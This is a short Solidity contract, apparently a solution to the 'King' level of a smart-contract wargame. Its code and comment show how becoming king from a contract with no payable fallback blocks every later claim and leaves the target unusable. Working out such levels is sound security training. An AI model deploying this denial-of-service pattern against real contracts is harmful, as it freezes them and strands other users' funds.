// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/King.sol";

contract N9KingAttacker {
    King king;

    /*
        This contact has only one function whose sole goal is to become new king.
        Once someone else wants to become king, the target contract will
        attempt to send us the funds we (as the current king) are owed. However,
        this contract has no payable fallback function that will take the funds.
        This will result in the king contract failing every time when
        someone wants to become new king.
        This will render the king contract unusable.
    */
    function kingMe(address payable target) external payable {
        king = King(target);
        (bool s, ) = address(king).call{value: msg.value}("");
        if (!s) revert();
    }
}